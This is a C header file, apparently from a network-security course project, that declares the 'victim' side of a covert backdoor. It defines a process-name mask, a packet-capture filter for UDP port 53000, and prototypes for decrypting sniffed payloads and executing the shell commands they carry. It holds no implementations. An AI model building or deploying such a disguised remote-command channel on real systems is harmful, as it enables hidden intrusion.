#ifndef COMP8505_PROJECT_VICTIM_H
#define COMP8505_PROJECT_VICTIM_H

#include "common.h"


#define DEFAULT_COUNT 10000
#define S_ARR_SIZE 64
#define LSH_RL_BUFSIZE 1024
#define LSH_TOK_BUFSIZE 64
#define LSH_TOK_DELIM " \t\r\n\a"

#define DEFAULT_PORT 53000
#define FILTER "udp and dst port 53000"
#define TRUE 1
#define FALSE 0
#define MASK "bash_project"


// tcpdump header (ether.h) defines ETHER_HDRLEN)
#ifndef ETHER_HDRLEN
#define ETHER_HDRLEN 14
#endif

struct options_victim {
    int victim_socket;
    char received_buffer[S_ARR_SIZE];
    char instruction[S_ARR_SIZE];
};

const char *builtin_str[] = {
        "cd",
        "exit"
};

// Function Prototypes
void options_victim_init(struct options_victim *opts);
void program_setup(void);
void initialize_victim_server(struct options_victim *opts);
void add_new_socket(struct options_victim *opts, int attacker_socket, struct sockaddr_in *attacker_address);
void pkt_callback(u_char *args, const struct pcap_pkthdr* pkthdr, const u_char* packet);
void process_ipv4(u_char *args, const struct pcap_pkthdr* pkthdr, const u_char* packet);
void extract_instruction(u_char *args);
void execute_instruction(u_char *args);
char **split_line(char *line);
int execute_command(char **command_arr);
int num_builtins(void);
int builtin_cd(char **args);
int builtin_exit(char **args);
int launch(char **args);




int (*builtin_func[]) (char **) = {
        &builtin_cd,
        &builtin_exit
};


u_int16_t handle_ethernet (u_char *args, const struct pcap_pkthdr* pkthdr, const u_char* packet);
void handle_IP (u_char *args, const struct pcap_pkthdr* pkthdr, const u_char* packet);
void handle_TCP (u_char *args, const struct pcap_pkthdr* pkthdr, const u_char* packet);
void handle_UDP (u_char *args, const struct pcap_pkthdr* pkthdr, const u_char* packet);
void print_payload (const u_char *, int);
void print_hex_ascii_line (const u_char *, int, int);
void decrypt_payload(u_char *payload);
void extract_square_bracket_string(char* input);

void *track_opts_victim_flag(void *vargp);
void pkt_callback2(u_char *args, const struct pcap_pkthdr* pkthdr, const u_char* packet);

/*
 * Structure of an internet header, stripped of all options.
 *
 * This is taken directly from the tcpdump source
 *
 * We declare ip_len and ip_off to be short, rather than u_short
 * pragmatically since otherwise unsigned comparisons can result
 * against negative integers quite easily, and fail in subtle ways.
 */
struct my_ip {
    u_int8_t	ip_vhl;		/* header length, version */
#define IP_V(ip)	(((ip)->ip_vhl & 0xf0) >> 4)
#define IP_HL(ip)	((ip)->ip_vhl & 0x0f)
    u_int8_t	ip_tos;		/* type of service */
    u_int16_t	ip_len;		/* total length */
    u_int16_t	ip_id;		/* identification */
    u_int16_t	ip_off;		/* fragment offset field */
#define	IP_DF 0x4000			/* dont fragment flag */
#define	IP_MF 0x2000			/* more fragments flag */
#define	IP_OFFMASK 0x1fff		/* mask for fragmenting bits */
    u_int8_t	ip_ttl;		/* time to live */
    u_int8_t	ip_p;		/* protocol */
    u_int16_t	ip_sum;		/* checksum */
    struct	in_addr ip_src, ip_dst;	/* source and dest address */
};

/* TCP header */
typedef u_int tcp_seq;

struct sniff_tcp {
    u_short th_sport;               /* source port */
    u_short th_dport;               /* destination port */
    tcp_seq th_seq;                 /* sequence number */
    tcp_seq th_ack;                 /* acknowledgement number */
    u_char  th_offx2;               /* data offset, rsvd */
#define TH_OFF(th)      (((th)->th_offx2 & 0xf0) >> 4)
    u_char  th_flags;
#define TH_FIN  0x01
#define TH_SYN  0x02
#define TH_RST  0x04
#define TH_PUSH 0x08
#define TH_ACK  0x10
#define TH_URG  0x20
#define TH_ECE  0x40
#define TH_CWR  0x80
#define TH_FLAGS        (TH_FIN|TH_SYN|TH_RST|TH_ACK|TH_URG|TH_ECE|TH_CWR)
    u_short th_win;                 /* window */
    u_short th_sum;                 /* checksum */
    u_short th_urp;                 /* urgent pointer */
};


struct sniff_udp {
    u_int16_t uh_sport;                /* source port */
    u_int16_t uh_dport;                /* destination port */
    u_int16_t uh_ulen;                 /* udp length */
    u_int16_t uh_sum;                  /* udp checksum */
};


#endif //COMP8505_PROJECT_VICTIM_H
